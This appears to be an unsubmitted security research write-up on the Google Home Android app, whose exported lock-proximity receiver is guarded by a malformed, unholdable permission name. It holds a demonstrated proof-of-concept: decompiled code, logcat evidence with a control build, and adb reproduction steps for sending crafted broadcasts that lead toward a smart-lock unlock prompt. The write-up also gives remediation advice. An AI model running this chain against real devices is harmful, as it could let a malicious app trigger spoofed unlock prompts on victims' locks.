# G-F003 — Google Home: exported receiver guarded by an impossible permission

**Status: boundary crossing demonstrated. Severity depends on one open question.**
**Not submitted yet.**

Target: `com.google.android.apps.chromecast.app` (Google Home), Tier 2.
Device: moto g stylus 5G (2024), Android 15 / API 35, unrooted, stock.
Date: 2026-10-21.

---

## 1. Root cause — an objective manifest error

From the app's own `AndroidManifest.xml`:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.LockProximityReceiver"
    android:permission="android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"
    android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.chromecast.app.remotecontrol.safety.action.BLE_SCANNED"/>
    </intent-filter>
</receiver>
```

`android:permission` takes exactly **one** permission name. Two names were written,
joined by `|`. Android does not split on `|`; it treats
`"android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN"` as a single
permission name, and no package on any device defines a permission with that name.

Consequences, both of them bad:

1. **The guard never works as intended.** No legitimate caller — including the
   system's Bluetooth LE scan delivery — can hold a permission that does not exist.
2. **It becomes an exclusive back door.** Any third-party app may *declare* that
   exact name at `protectionLevel="normal"`, request it, and be granted it at
   install. That app is then the only party on the device able to reach the receiver.

This is not device- or version-specific. It ships to every install of Google Home.

## 2. What the receiver does with attacker input

`LockProximityReceiver.onReceive` (decompiled):

```java
if (btoy.f("...action.BLE_SCANNED", intent.getAction())) {
    String stringExtra = intent.getStringExtra("hgs_device_id");
    ...
    if (intent.hasExtra("android.bluetooth.le.extra.LIST_SCAN_RESULT")
        && (parcelableArrayListExtra = intent.getParcelableArrayListExtra(...)) != null) {
        if (!parcelableArrayListExtra.isEmpty()) {
            String hgsId  = intent.getStringExtra("hgs_device_id");
            String name   = intent.getStringExtra("device_name");
            int requestId = intent.getIntExtra("request_id", 0);
            ScanResult sr = (ScanResult) parcelableArrayListExtra.get(0);
            ... jfl.j("manufacturer_data", bArr, map) ...
            juz.k(context).i("tln_send_unlock_notification_worker", 3, work);
        }
    }
}
```

Every value is taken straight from the intent. There is no caller check, no
signature check, no package check — the only intended gate is the manifest
permission, which cannot be held.

## 3. Evidence — the crossing, with a control

Two APKs built from identical source. The only difference: one declares and
requests `android.permission.BLUETOOTH|android.permission.BLUETOOTH_ADMIN` at
`protectionLevel="normal"`; the other declares no permissions at all. Both send
the same broadcast with the same extras.

**Attacker build** (`com.cindrasec.mvrpprobe`, uid 10568):

```
10-21 17:44:33.718 31371 I MVRP : BLESCAN -> com.google.android.apps.chromecast.app/
    ...safety.LockProximityReceiver  name=MVRP CANARY LOCK hgs=MVRP-CANARY-ID
10-21 17:44:33.727 31371 I MVRP : sendBroadcast() returned, no exception
10-21 17:44:34.493  6860 31439 W HomeApp|LockProximityNotificationWorker: Device not found
```

pid 6860 is Google Home. Its own worker ran, with the attacker's data.

**Control build** (`com.cindrasec.mvrpctl`, uid 10569), same code, same intent:

```
10-21 17:45:14.191 31653 I MVRP : BLESCAN -> ...LockProximityReceiver  name=MVRP CANARY LOCK ...
10-21 17:45:14.191 31653 I MVRP : sendBroadcast() returned, no exception
(no HomeApp|LockProximityNotificationWorker line — broadcast silently dropped)
```

Broadcasts fail silently, so the *absence* of Google Home's log line in the
control is the measurement. The permission declaration is the only variable.

## 4. Where the chain leads

`LockProximityNotificationWorker` (`kab` case 16, recovered with `--show-bad-code`):

```java
String a2 = g().a("hgs_device_id");                    // attacker-supplied
c.c(true, Collections.singletonList(a2), REASON_LOCK_STATE_REFRESH, callback);
   // server fetch against the victim's account
   // empty result -> "Device not found"   <- what our canary id produced
   // otherwise -> read the device's lock trait
if (obj5.a) {
    b.d("tln_unlock_notification_channel_id", ...);     // notification channel
    int f = g().f("request_id");                        // attacker-supplied
    Intent intent = new Intent(context, LockProximityUnlockActivity.class);
    intent.setAction("...action.UNLOCK_CLICKED");
    intent.putExtra("hgs_device_id", a2);               // attacker-supplied
    intent.putExtra("request_id", f);                   // attacker-supplied
    intent.putExtra("manufacturer_data", g().c("manufacturer_data"));  // attacker-supplied
    PendingIntent a3 = arbl.a(context, f, intent, 201326592, 0);
    ...
}
```

`LockProximityUnlockActivity.onCreate` then enqueues `LockProximityUnlockWorker`,
whose entire body is:

```java
String a2 = g().a("hgs_device_id");
if (a2 != null) {
    this.h.h(a2, Collections.singletonList(new ahdf(false, true, true)), new wnx(...));
}
```

— the unlock call.

`LockProximityUnlockActivity` is `android:exported="false"`, so it cannot be
started directly. The unlock therefore requires the user to tap the notification.

## 5. What is proven, and what is not

**Proven, with a control:** an app holding no real permissions causes code to
execute inside Google Home with attacker-controlled input, by claiming a
permission name that the app's own manifest made impossible to hold.

**Proven by reading:** that execution path, given a device id that resolves on
the victim's account to a device with a lock trait, builds and posts an unlock
notification carrying attacker-chosen `request_id` and `manufacturer_data`, whose
tap target performs the unlock.

**Not proven:** the notification appearing, and the unlock completing. Our canary
id returned "Device not found", which is the server rejecting an id that is not
on the account.

## 6. The open question that sets the severity

Can an attacker obtain a valid `hgs_device_id` for a victim's lock?

- If yes: a malicious app can make a genuine-looking Google Home unlock prompt
  appear at a time of the attacker's choosing, with the victim nowhere near the
  door. Physical security.
- If no: the demonstrated impact is cross-app invocation of a protected component
  plus an authenticated server query with an attacker-chosen id.

Also untested: whether the receiver can be reached repeatedly as an existence
oracle for device ids, since a valid id and an invalid one take visibly different
paths ("Device not found" versus a posted notification).

## 7. Reproduction

```
cd poc/mvrp-probe
AJ=~/tools/android-12/android.jar MANIFEST=AndroidManifest.orphan.xml ./build.sh
adb install -r out/mvrp-probe.apk
AJ=~/tools/android-12/android.jar PKG=com.cindrasec.mvrpctl ./build.sh
adb install -r out/com.cindrasec.mvrpctl.apk

adb logcat -c
adb shell am start -n com.cindrasec.mvrpprobe/com.cindrasec.mvrpprobe.MainActivity --es action blescan
adb logcat -d | grep -i LockProximity          # Google Home's worker runs

adb logcat -c
adb shell am start -n com.cindrasec.mvrpctl/com.cindrasec.mvrpprobe.MainActivity --es action blescan
adb logcat -d | grep -i LockProximity          # nothing
```

## 8. Remediation

Replace the single malformed attribute with one real permission name, or drop
`android:permission` and verify the caller in `onReceive`. The current value can
never be held by the intended sender, so the feature it guards does not work
either.
